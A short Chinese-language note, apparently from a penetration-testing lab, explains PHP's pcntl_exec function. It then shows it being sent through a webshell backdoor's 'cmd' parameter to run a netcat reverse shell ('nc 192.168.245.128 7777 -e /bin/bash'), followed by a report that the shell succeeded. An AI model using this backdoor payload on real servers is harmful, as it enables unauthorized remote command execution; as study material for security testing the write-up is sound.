# pcntl_exec
**函数运行**：在当前进程空间执行指定程序  
**运行条件**：**需要安装pcntl扩展**（默认不安装）  
**参数**：`pcntl_exec(string $path, array $args = ?, array $envs = ?)`

- `$path`: 可执行文件路径
    
- `$args`: 参数数组
    
- `$envs`: 环境变量数组  
**能否回显**：❌ **不能直接回显**，且执行后当前PHP进程会终止
```php
pcntl_exec("/bin/bash", ["-c", "whoami"]);  // 进程被替换，无回显
```

![](./img/Pasted%20image%2020251025180443.png)![](./img/Pasted%20image%2020251025180147.png)
	pcntl可用
![](./img/Pasted%20image%2020251025180230.png)
	根据后门POST提交cmd参数

Post提交
```http
?cmd=pcntl_exec("/bin/bash",array("-c","nc 192.168.245.128 7777 -e /bin/bash"));
```
- $path-->/bin/bash
- $args-->array("-c","nc 192.168.245.128 7777 -e /bin/bash")
	- -c -->执行二进制文件
	- nc -->反弹tcp连接到目标主机的监听端口
	- -e /bin/bash -->返回命令行交互界面

![](./img/Pasted%20image%2020251025180633.png)
反弹shell成功
![](./img/Pasted%20image%2020251025180700.png)